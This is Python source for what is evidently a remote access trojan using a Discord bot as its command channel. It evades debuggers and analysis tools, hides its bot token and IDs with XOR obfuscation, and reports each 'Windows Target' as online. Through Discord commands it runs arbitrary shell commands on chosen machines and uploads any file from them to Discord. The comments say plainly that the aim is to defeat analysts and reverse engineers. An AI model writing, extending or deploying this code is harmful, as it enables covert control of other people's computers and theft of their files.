import discord
import subprocess
import os
import asyncio
import platform
import sys
import ctypes

# ── Anti-analysis defenses ──────────────────────────────────────────────
# Run before anything sensitive. Exits silently if debugger/analysis tool
# is detected. Best-effort — raises the bar, not a guarantee.
from defenses import run_defenses

run_defenses()

# ── XOR-obfuscated configuration ────────────────────────────────────────
# The real token, channel ID, and admin ID are NEVER in plaintext here.
# They are XOR-obfuscated. At runtime they are decoded in memory and used.
#
# To regenerate with real values:
#     python token_gen.py <bot_token> <channel_id> <admin_id>
# and paste the output into the _*_XORED lists below.
#
# WARNING: This file is committed to git. The XOR key and obfuscated bytes
# are in the repo. An analyst who reverses the decode logic can recover the
# values. This defends against casual static analysis (strings, grep) — it
# is NOT a guarantee against a determined reverse engineer with a debugger.

_XOR_KEY = 0x42

# ── PASTE GENERATED TOKEN BYTES HERE (from token_gen.py) ────────────────
_TOKEN_XORED = [
    0x00,
]

# ── PASTE GENERATED CHANNEL ID BYTES HERE ───────────────────────────────
_CHANNEL_XORED = [
    0x00,
]

# ── PASTE GENERATED ADMIN ID BYTES HERE ────────────────────────────────
_ADMIN_XORED = [
    0x00,
]


def _decode_xor(xored_list, key):
    """Decode XOR-obfuscated bytes → raw bytes. Used once at startup."""
    return bytes(b ^ key for b in xored_list)


def _wipe_xor_list(lst):
    """Best-effort wipe: overwrite the XOR-obfuscated list with zeros."""
    for i in range(len(lst)):
        lst[i] = 0


# ── Decode config at startup ────────────────────────────────────────────
# Decode once, keep decoded values in memory for the life of the process.
# A memory dump taken while running WILL find these — the XOR storage only
# defends static analysis of the binary on disk, not runtime dumps.

_TOKENS = _decode_xor(_TOKEN_XORED, _XOR_KEY)
_CHANNEL = int(_decode_xor(_CHANNEL_XORED, _XOR_KEY))
_ADMIN = int(_decode_xor(_ADMIN_XORED, _XOR_KEY))

# Wipe the XOR-obfuscated source lists (defense in depth — removes the
# obfuscated data too, leaving only the decoded values in memory).
_wipe_xor_list(_TOKEN_XORED)
_wipe_xor_list(_CHANNEL_XORED)
_wipe_xor_list(_ADMIN_XORED)

# Clean up helper functions (keep decoded values)
del _decode_xor
del _wipe_xor_list

# ── Intents and client ──────────────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True

# AutoShardedClient allows the same token to sit on multiple machines
# without fighting over the Discord gateway connection.
client = discord.AutoShardedClient(intents=intents)

COMPUTER_NAME = platform.node().upper()

# ── Events ──────────────────────────────────────────────────────────────

@client.event
async def on_ready():
    channel = client.get_channel(_CHANNEL)
    if channel:
        await channel.send(
            f"\U0001f5a5\ufe0f **Windows Target [{COMPUTER_NAME}] is online.** Ready for actions."
        )


@client.event
async def on_message(message):
    if (
        message.author == client.user
        or message.channel.id != _CHANNEL
        or message.author.id != _ADMIN
    ):
        return

    # ── FEATURE 1: Target execution ────────────────────────────────────
    if message.content.startswith("!exec "):
        parts = message.content[6:].split(" ", 1)
        if len(parts) < 2:
            return

        target_machine = parts[0].upper()
        command = parts[1]

        if target_machine == COMPUTER_NAME:
            await message.channel.send(
                f"\u2699\ufe0f `[{COMPUTER_NAME}]` Running command: `{command}`..."
            )

            try:
                loop = asyncio.get_event_loop()

                def run_cmd():
                    return subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        errors="replace",
                        timeout=30,
                    )

                result = await loop.run_in_executor(None, run_cmd)

                output = result.stdout if result.stdout else result.stderr
                if not output:
                    output = "[Executed successfully with no text output]"

                if len(output) > 1900:
                    with open(f"{COMPUTER_NAME}_out.txt", "w", encoding="utf-8") as f:
                        f.write(output)
                    await message.channel.send(
                        content=(
                            f"\U0001f4c1 `[{COMPUTER_NAME}]` "
                            "Output too long for chat. Sent as file:"
                        ),
                        file=discord.File(f"{COMPUTER_NAME}_out.txt"),
                    )
                    os.remove(f"{COMPUTER_NAME}_out.txt")
                else:
                    await message.channel.send(
                        f"```cmd\n[{COMPUTER_NAME} Output]\n{output}\n```"
                    )
            except asyncio.TimeoutError:
                await message.channel.send(
                    f"\u274c `[{COMPUTER_NAME}]` "
                    "Error: Command timed out after 30 seconds."
                )
            except Exception as e:
                await message.channel.send(
                    f"\u274c `[{COMPUTER_NAME}]` "
                    f"Execution failed: `{str(e)}`"
                )

    # ── FEATURE 2: File Download ───────────────────────────────────────
    elif message.content.startswith("!download "):
        parts = message.content[10:].split(" ", 1)
        if len(parts) < 2:
            return

        target_machine = parts[0].upper()
        file_path = parts[1].strip().replace('"', "")

        if target_machine == COMPUTER_NAME:
            if not os.path.exists(file_path):
                await message.channel.send(
                    f"\u274c `[{COMPUTER_NAME}]` "
                    "Error: File path does not exist."
                )
                return

            # Note: 2026 Discord non-premium limit is 25MB
            file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
            if file_size_mb > 25:
                await message.channel.send(
                    f"\u274c `[{COMPUTER_NAME}]` "
                    f"Error: File is {file_size_mb:.2f}MB. (Max 25MB)"
                )
                return

            await message.channel.send(
                f"\U0001f4e4 `[{COMPUTER_NAME}]` "
                f"Uploading: `{os.path.basename(file_path)}`..."
            )
            try:
                await message.channel.send(
                    content=(
                        f"\u2705 File fetched from `[{COMPUTER_NAME}]`:"
                    ),
                    file=discord.File(file_path),
                )
            except Exception as e:
                await message.channel.send(
                    f"\u274c `[{COMPUTER_NAME}]` "
                    f"Upload failed: `{str(e)}`"
                )

    # ── FEATURE 3: Broadcast Ping ──────────────────────────────────────
    elif message.content.strip() == "!pingall":
        await message.channel.send(
            f"\U0001f44b `[{COMPUTER_NAME}]` is alive and active!"
        )


# ── Run ────────────────────────────────────────────────────────────────
# _TOKEN holds the decoded bot token as bytes. client.run() needs a str.
# We convert here — the str will be in memory for the life of the process.
# There is no way to avoid this with discord.py; the token must be in memory
# for the gateway connection to work. The XOR storage only defends static
# analysis of the binary on disk.
_TOK_str = _TOKENS.decode("utf-8")

# Delete the bytes object (the str is a copy — both will be in memory)
del _TOKENS

client.run(_TOK_str)
